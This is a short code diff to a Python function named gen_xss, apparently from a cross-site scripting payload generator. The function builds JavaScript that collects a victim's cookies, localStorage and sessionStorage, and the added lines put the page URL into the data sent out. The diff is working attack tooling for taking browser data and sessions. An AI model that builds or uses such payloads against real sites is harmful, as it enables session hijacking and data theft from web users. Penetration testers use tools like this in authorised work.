@@ -46,6 +46,10 @@ def gen_xss(id):
                 require_js = True
             else:
                 return jsonify({'status': 'error', 'detail': 'Unknown code type'}), 400
+        elif param == 'geturl':
+            get_url = True
+            require_js = True
+            require_params = True
         else:
             if other_data != '':
                 other_data += '&'
@@ -80,6 +84,11 @@ def gen_xss(id):
             if cookies or local_storage:
                 payload += '+"&'
             payload += 'session_storage="+encodeURIComponent(JSON.stringify(sessionStorage))'
+
+        if get_url:
+            if cookies or local_storage or session_storage:
+                payload += '+"&'
+            payload += 'origin_url="+encodeURIComponent(location.href)'
 
         if other_data != '':
             if cookies or local_storage or session_storage:
